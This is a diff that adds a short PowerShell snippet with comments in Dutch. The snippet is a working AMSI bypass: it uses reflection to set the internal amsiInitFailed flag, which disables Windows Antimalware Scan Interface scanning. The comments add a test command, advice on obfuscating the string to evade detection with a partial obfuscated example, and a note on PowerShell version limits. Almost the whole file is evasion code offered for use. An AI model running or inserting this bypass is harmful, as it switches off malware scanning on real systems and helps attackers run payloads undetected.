@@ -1,0 +1,9 @@
+# AMSI Bypass via amsiInitFailed flag
+# Zet interne 'amsiInitFailed' flag naar true - AMSI denkt dat initialisatie gefaald is
+# Alle volgende scans worden overgeslagen
+$a=[Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
+# Test: IEX 'amsiutils'
+# Tip: Simpelste bypass maar wordt vaak gedetecteerd op de string
+# Tip: Obfuscatie voorbeeld:
+# $w = 'System.Management.Automation.A]'; $c = 'si]Ut]able'.Replace(']',''); $z = [Ref].Assembly.GetType(($w + 'm' + $c)); ...
+# Tip: Werkt niet in PowerShell 7+ (andere internals)
